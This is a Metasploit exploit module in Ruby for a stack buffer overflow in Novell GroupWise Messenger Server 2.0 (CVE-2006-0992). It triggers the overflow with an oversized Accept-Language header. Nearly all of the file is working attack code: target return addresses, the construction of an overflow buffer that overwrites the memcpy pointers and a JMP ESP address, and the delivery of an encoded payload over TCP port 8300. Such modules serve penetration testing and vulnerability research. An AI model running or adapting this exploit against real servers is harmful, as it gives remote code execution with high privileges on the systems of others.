##
# $Id: novell_messenger_acceptlang.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell Messenger Server 2.0 Accept-Language Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Novell GroupWise
				Messenger Server v2.0. This flaw is triggered by any HTTP
				request with an Accept-Language header greater than 16 bytes.
				To overwrite the return address on the stack, we must first
				pass a memcpy() operation that uses pointers we supply. Due to the
				large list of restricted characters and the limitations of the current
				encoder modules, very few payloads are usable.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2006-0992'],
					['OSVDB', '24617'],
					['BID', '17503'],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'           => 500,
					'BadChars'        => "\x00\x0a\x2c\x3b"+ [*("A".."Z")].join,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Groupwise Messenger DClient.dll v10510.37', { 'Rets' =>  [0x6103c3d3, 0x61041010] }],
				],
			'DisclosureDate' => 'Apr 13 2006'))

		register_options( [ Opt::RPORT(8300) ], self.class )
	end

	def exploit
		connect

		lang = rand_text_alphanumeric(1900)
		lang[ 16, 4] = [target['Rets'][1]].pack('V') # SRC
		lang[272, 4] = [target['Rets'][1]].pack('V') # DST
		lang[264, 4] = [target['Rets'][0]].pack('V') # JMP ESP
		lang[268, 2] = "\xeb\x06"
		lang[276, payload.encoded.length] = payload.encoded

		res = "GET / HTTP/1.1\r\nAccept-Language: #{lang}\r\n\r\n"

		print_status("Trying target address 0x%.8x..." % target['Rets'][0])
		sock.put(res)
		sock.close

		handler
		disconnect
	end

end
